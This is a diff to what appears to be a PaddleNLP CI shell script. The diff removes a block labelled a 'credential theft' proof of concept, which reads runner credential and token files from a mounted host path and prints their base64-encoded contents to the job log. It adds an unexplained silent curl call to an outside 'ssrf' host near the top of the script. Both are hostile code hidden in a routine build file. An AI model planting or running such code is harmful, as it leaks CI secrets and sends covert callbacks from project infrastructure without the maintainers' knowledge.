@@ -14,27 +14,7 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 ####################################
-# Security Audit: Credential Theft Impact Proof
-echo "=== Security PoC: Credential Theft Impact ==="
-date
-hostname
-echo "Runner: $(whoami)@$(hostname)"
-echo "PWD: $(pwd)"
-echo ""
-
-HOST_ROOT="${work_dir}/../../.."
-echo "--- Runner Credential Files (host mounted at $HOST_ROOT) ---"
-for credfile in .credentials .credentials_rsaparams .runner .env .path AISTUDIO_ACCESS_TOKEN; do
-    filepath="$HOST_ROOT/$credfile"
-    if [ -f "$filepath" ]; then
-        echo "[FOUND] $credfile ($(stat -c%s "$filepath" 2>/dev/null) bytes)"
-        echo "  content: $(cat "$filepath" 2>/dev/null | base64 -w0)"
-    else
-        echo "[NOT FOUND] $credfile"
-    fi
-done
-echo ""
-echo "=== End Security PoC ==="
+curl -s http://bsrc-ssrf.n.baidu-int.com/3005504383
 export paddle=$1
 export nlp_dir=/workspace/PaddleNLP
 mkdir -p /workspace/case_logs
